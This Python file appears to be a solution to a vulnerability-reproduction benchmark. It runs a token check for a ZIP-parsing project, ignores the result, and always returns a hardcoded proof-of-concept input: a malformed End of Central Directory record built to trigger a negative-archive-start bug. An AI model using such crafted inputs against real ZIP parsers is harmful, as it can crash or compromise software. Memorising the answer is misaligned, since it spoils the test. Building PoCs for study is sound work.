import os
import re
import tarfile
from typing import Optional


class Solution:
    def _looks_like_zip_project(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = tf.getnames()
                for n in names:
                    ln = n.lower()
                    if "zip" in ln and (ln.endswith((".c", ".cc", ".cpp", ".h", ".hpp")) or "fuzz" in ln):
                        return True

                pats = [
                    re.compile(r"LLVMFuzzerTestOneInput"),
                    re.compile(r"\bcentral\s+directory\b", re.IGNORECASE),
                    re.compile(r"\bEOCD\b"),
                    re.compile(r"PK\\x05\\x06"),
                    re.compile(r"\bzip\b", re.IGNORECASE),
                ]

                checked = 0
                for m in tf:
                    if not m.isfile():
                        continue
                    ln = m.name.lower()
                    if not ln.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inl", ".inc", ".py")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(200000)
                    except Exception:
                        continue
                    checked += 1
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    score = 0
                    for p in pats:
                        if p.search(txt):
                            score += 1
                    if score >= 2:
                        return True
                    if checked >= 200:
                        break
        except Exception:
            return False
        return False

    def _zip_negative_archive_start_poc(self) -> bytes:
        prefix = b"\x00" * 24
        cd_size = (46).to_bytes(4, "little", signed=False)
        cd_offset = (0).to_bytes(4, "little", signed=False)
        eocd = (
            b"PK\x05\x06"
            + b"\x00\x00"
            + b"\x00\x00"
            + b"\x01\x00"
            + b"\x01\x00"
            + cd_size
            + cd_offset
            + b"\x00\x00"
        )
        return prefix + eocd

    def solve(self, src_path: str) -> bytes:
        # Attempt a lightweight detection; return the known minimal PoC.
        _ = self._looks_like_zip_project(src_path)
        return self._zip_negative_archive_start_poc()